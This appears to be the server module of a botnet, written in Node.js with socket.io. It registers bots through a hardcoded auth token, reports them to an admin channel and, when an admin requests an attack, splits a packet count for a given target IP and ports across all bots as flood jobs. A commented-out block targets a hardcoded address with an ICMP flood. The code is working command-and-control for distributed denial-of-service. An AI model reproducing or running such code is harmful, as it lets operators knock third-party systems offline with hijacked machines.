const { Client, AttackType } = require("../lib/classes/client");
const { SocketService } = require("../lib/classes/client_socket_list");
const authToken = "c1e8798209-0,c21ce21e2c12";
let tasks = [];
// no_of_packets,progress,clientsLen,id
module.exports = function (io) {
  let botsIo = io.of("/bots");
  let adminIo = io.of("/admin");
  botsIo.on("connection", async (socket) => {
    console.log(`Got a new client [@${socket.id}]`);
    socket.emit("meta_requested", (client_meta) => {
      if ([0].includes(client_meta.version)) {
        //is it in the  to be rejected list
        console.log("Rejected a server");
        socket.emit("connection rejected", "reason => Outdated server");
        socket.disconnect(true);
        console.log(
          `Client rejected, clients list length  = [${SocketService.botsList.length}]`
        );
      } else {
        console.log("Got a new client");
        console.log(client_meta);
        SocketService.botsList.push(
          new Client({
            ...client_meta,
            socket: socket,
            id: socket.id,
          })
        );
        console.log(
          `New client connected, clients list length  = [${SocketService.botsList.length}]`
        );
        console.log("====================================");
        console.log("Notifying all the admins a new bot got added");
        console.log("====================================");
        adminIo.emit("on_botnet_change", {
          availableBots: SocketService.botsList.map((e) => {
            return { ...e, socket: null };
          }),
        });
        // let no_of_packets = 100;
        // let target_ip = "192.168.43.190";
        // dport = 80;
        // sport = 80;
        // let no_of_packets_per_bot = Math.floor(
        //   no_of_packets / SocketService.botsList.length
        // );

        // //
        // tasks = SocketService.botsList.map((e) => {
        //   return {
        //     socket: e.socket,
        //     progress: 0,
        //     id: socket.id,
        //     attackDetails: {
        //       attackType: AttackType.icmp,
        //       no_of_packets: no_of_packets_per_bot,
        //       target_ip,
        //       dport,
        //       sport,
        //     },
        //   };
        // });
        // // Distribute le tasks to the other users
        // if (SocketService.botsList.length >= 2) {
        //   tasks.forEach((e) => {
        //     e.socket.emit("job_arrival", {
        //       id: e.id,
        //       attackDetails: e.attackDetails,
        //     });
        //   });
        // }
      }
    });
    //! ---------------------------------------------------------

    socket.on("disconnect", function (reason) {
      console.log("Got a disconnect @", socket.id);
      console.log(`reason => ${reason}`);
      //Remove the client
      SocketService.botsList = SocketService.botsList.filter(
        (client) => client.id != socket.id
      );
      console.log(`clients list length  = [${SocketService.botsList.length}]`);
      adminIo.emit("on_botnet_change", {
        availableBots: SocketService.botsList.map((e) => {
          return { ...e, socket: null };
        }),
      });

      
    });

    socket.on("on_progress_update", function (data) {
      const { id, progress } = data;
      tasks = tasks.map((e) => {
        if (e.id == id) {
          return {
            ...e,
            progress,
          };
        } else {
          return { ...e };
        }
      });
      let totalProgress = tasks.reduce((a, b) => +a + +b.progress, 0);
      let total_packets = tasks.reduce(
        (a, b) => +a + +b.attackDetails.no_of_packets,
        0
      );
      // console.log("====================================");
      // console.log(totalProgress);
      // console.log("====================================");
      if (totalProgress >= 100 * tasks.length) {
        adminIo.emit("on_progress_update", { progress: 100 });
        tasks = [];
      } else {
        adminIo.emit("on_progress_update", {
          progress: Number(totalProgress / tasks.length).toFixed(1),
          total_packets_sent: Number(
            ((total_packets * totalProgress) / tasks.length) * 0.01
          ).toFixed(0),
        });
      }
    });
  });

  botsIo.use(function (socket, next) {
    if (socket.handshake.auth.token == authToken) {
      // console.log(socket.handshake.auth.token == authToken);
      next();
    } else {
      console.log("Unauthorized user @" + socket.id);
      socket.emit("connection rejected", "fuck off");
      socket.disconnect(true);
      next(new Error("Authentication error"));
    }
  });

  adminIo.on("connection", async (socket) => {
    console.log(`Got an admin client [@${socket.id}]`);
    socket.emit("on_botnet_change", {
      availableBots: SocketService.botsList.map((e) => {
        return { ...e, socket: null };
      }),
    });

    socket.on("on_attack_requested", function (attackDetails) {
      const { no_of_packets, target_ip, dport, sport } = attackDetails;
      let no_of_packets_per_bot = Math.floor(
        no_of_packets / SocketService.botsList.length
      );
      tasks = SocketService.botsList.map((e) => {
        return {
          socket: e.socket,
          progress: 0,
          id: socket.id,
          attackDetails: {
            ...attackDetails,
            no_of_packets: no_of_packets_per_bot,
          },
        };
      });
      tasks.forEach((e) => {
        e.socket.emit("job_arrival", {
          id: e.id,
          attackDetails: e.attackDetails,
        });
      });
    });
    socket.on("disconnect", function (reason) {
      console.log("Got an admin disconnect @", socket.id);
      console.log(`reason => ${reason}`);
    });
  });
};
